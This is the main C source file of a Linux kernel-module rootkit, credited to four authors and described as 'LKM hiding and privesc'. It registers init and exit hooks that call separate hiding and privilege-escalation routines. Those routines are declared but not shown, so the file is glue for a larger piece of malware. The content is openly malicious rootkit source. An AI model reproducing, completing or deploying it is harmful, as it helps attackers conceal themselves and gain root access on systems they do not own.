#include <linux/init.h>
#include <linux/module.h>

void hidden_init(void);
void hidden_exit(void);
void privesc_init(void);
void privesc_exit(void);

static int __init rootkit_init(void) {
    hidden_init();
    privesc_init();
    return 0;
}

static void __exit rootkit_exit(void) {
    privesc_exit();
    hidden_exit();
}

module_init(rootkit_init);
module_exit(rootkit_exit);

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Wayko, Marx, Helpy, Sutoukaa");
MODULE_DESCRIPTION("LKM hiding and privesc");
MODULE_VERSION("1.0");